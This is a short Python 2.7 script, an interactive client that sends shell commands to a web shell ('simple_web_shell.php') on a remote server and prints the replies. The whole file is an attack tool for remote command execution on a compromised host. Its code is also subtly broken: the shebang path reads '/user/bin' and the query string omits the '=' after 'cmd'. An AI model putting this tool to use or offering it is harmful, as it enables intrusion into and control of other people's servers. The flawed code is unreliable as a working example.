#!/user/bin/python2.7

# This script is used to send commands to the simple_web_shell.php 

import urllib2, sys

shell = sys.argv[1]
# line below will get the host address by splitting on /
host = shell.split("/")[2]

while True:
    command = raw_input("shell@{0}>>".format(host))
    req1 = str("{0}?cmd{1}".format(shell, command)).replace(" ", "%20")
    request = urllib2.urlopen(req1)
    print request.read() #server response